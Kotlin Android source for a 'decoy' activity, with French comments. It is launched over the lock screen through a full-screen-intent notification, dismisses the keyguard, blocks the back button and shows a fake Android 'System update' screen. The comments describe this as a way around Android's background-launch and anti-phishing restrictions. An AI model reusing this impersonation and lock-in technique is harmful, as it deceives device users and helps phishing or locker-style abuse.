package oblivion.v2.ui.decoy

import android.app.KeyguardManager
import android.os.Build
import android.os.Bundle
import android.view.WindowManager
import androidx.activity.ComponentActivity
import androidx.activity.compose.setContent
import androidx.compose.animation.core.LinearEasing
import androidx.compose.animation.core.animateFloatAsState
import androidx.compose.animation.core.tween
import androidx.compose.foundation.background
import androidx.compose.foundation.layout.Arrangement
import androidx.compose.foundation.layout.Box
import androidx.compose.foundation.layout.Column
import androidx.compose.foundation.layout.Spacer
import androidx.compose.foundation.layout.fillMaxSize
import androidx.compose.foundation.layout.fillMaxWidth
import androidx.compose.foundation.layout.height
import androidx.compose.foundation.layout.padding
import androidx.compose.foundation.layout.size
import androidx.compose.foundation.shape.CircleShape
import androidx.compose.foundation.shape.RoundedCornerShape
import androidx.compose.material3.LinearProgressIndicator
import androidx.compose.material3.Text
import androidx.compose.runtime.Composable
import androidx.compose.runtime.LaunchedEffect
import androidx.compose.runtime.getValue
import androidx.compose.runtime.mutableStateOf
import androidx.compose.runtime.remember
import androidx.compose.runtime.setValue
import androidx.compose.ui.Alignment
import androidx.compose.ui.Modifier
import androidx.compose.ui.draw.clip
import androidx.compose.ui.graphics.Color
import androidx.compose.ui.res.stringResource
import androidx.compose.ui.text.font.FontFamily
import androidx.compose.ui.text.font.FontWeight
import androidx.compose.ui.text.style.TextAlign
import androidx.compose.ui.unit.dp
import androidx.compose.ui.unit.sp
import kotlinx.coroutines.delay
import oblivion.v2.R

/**
 * Écran leurre "Mise à jour système" lancé via **FullScreenIntent**
 * notification (Mode Decoy Option A).
 *
 * Sur Android 10+, ni `startActivity()` depuis un service, ni un overlay
 * `TYPE_APPLICATION_OVERLAY` ne peuvent s'afficher par-dessus le lockscreen
 * (restrictions BAL + anti-phishing). La seule méthode qui contourne ces
 * barrières est la notification `fullScreenIntent` : le système Android
 * lui-même dismisse le keyguard et lance l'activity en plein écran.
 *
 * L'activity est déclarée dans le manifest avec :
 *  - `showWhenLocked=true` : s'affiche sur le lockscreen
 *  - `turnScreenOn=true` : allume l'écran si éteint
 *  - `excludeFromRecents=true` : pas dans la liste des tâches
 *  - `noHistory=true` : ne reste pas dans le back stack
 *  - `launchMode=singleInstance` : une seule instance à la fois
 *
 * Le design imite le vrai écran "Mise à jour système" Android : fond
 * gris foncé, cercle vert façon logo Android, barre de progression
 * bleue Google 0 → 100 % sur 30 s, compteur %, note "Ne pas éteindre".
 */
class DecoyActivity : ComponentActivity() {

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        // Affichage sur le lockscreen + allumage de l'écran. API 27+ pour
        // les méthodes ; flags window comme fallback API 26.
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O_MR1) {
            setShowWhenLocked(true)
            setTurnScreenOn(true)
            val km = getSystemService(KeyguardManager::class.java)
            km?.requestDismissKeyguard(this, null)
        }

        window.addFlags(
            WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED or
                WindowManager.LayoutParams.FLAG_TURN_SCREEN_ON or
                WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON or
                WindowManager.LayoutParams.FLAG_SECURE or
                WindowManager.LayoutParams.FLAG_FULLSCREEN,
        )

        setContent {
            FakeSystemUpdateScreen()
        }
    }

    /** Le bouton retour est neutralisé — rien ne doit quitter l'écran leurre. */
    @Deprecated("Deprecated in Java")
    override fun onBackPressed() {
        // no-op
    }
}

// ════════════════════════════════════════════════════════════════════
// UI : fausse page "Mise à jour système"
// ════════════════════════════════════════════════════════════════════

@Composable
private fun FakeSystemUpdateScreen() {
    var target by remember { mutableStateOf(0f) }
    val progress by animateFloatAsState(
        targetValue = target,
        animationSpec = tween(durationMillis = 30_000, easing = LinearEasing),
        label = "update_progress",
    )
    LaunchedEffect(Unit) {
        delay(300)
        target = 1f
    }

    val percent = (progress * 100f).toInt().coerceIn(0, 100)

    Box(
        modifier = Modifier
            .fillMaxSize()
            .background(Color(0xFF202124)),
        contentAlignment = Alignment.Center,
    ) {
        Column(
            horizontalAlignment = Alignment.CenterHorizontally,
            verticalArrangement = Arrangement.Center,
            modifier = Modifier
                .fillMaxWidth()
                .padding(horizontal = 32.dp),
        ) {
            AndroidLogoPlaceholder()

            Spacer(Modifier.height(48.dp))

            Text(
                text = stringResource(R.string.decoy_update_title),
                color = Color.White,
                fontSize = 22.sp,
                fontWeight = FontWeight.Medium,
                fontFamily = FontFamily.SansSerif,
                textAlign = TextAlign.Center,
            )

            Spacer(Modifier.height(12.dp))

            Text(
                text = stringResource(R.string.decoy_update_subtitle),
                color = Color(0xFFBDBDBD),
                fontSize = 14.sp,
                fontFamily = FontFamily.SansSerif,
                textAlign = TextAlign.Center,
            )

            Spacer(Modifier.height(36.dp))

            LinearProgressIndicator(
                progress = { progress },
                modifier = Modifier
                    .fillMaxWidth()
                    .height(6.dp)
                    .clip(RoundedCornerShape(3.dp)),
                color = Color(0xFF8AB4F8),
                trackColor = Color(0xFF3C4043),
            )

            Spacer(Modifier.height(20.dp))

            Text(
                text = "$percent%",
                color = Color.White,
                fontSize = 28.sp,
                fontWeight = FontWeight.Light,
                fontFamily = FontFamily.SansSerif,
            )

            Spacer(Modifier.height(8.dp))

            Text(
                text = stringResource(R.string.decoy_update_note),
                color = Color(0xFF9AA0A6),
                fontSize = 12.sp,
                fontFamily = FontFamily.SansSerif,
                textAlign = TextAlign.Center,
            )
        }
    }
}

@Composable
private fun AndroidLogoPlaceholder() {
    Box(
        contentAlignment = Alignment.Center,
        modifier = Modifier.size(96.dp),
    ) {
        Box(
            modifier = Modifier
                .size(80.dp)
                .clip(CircleShape)
                .background(Color(0xFF3DDC84)),
        )
    }
}
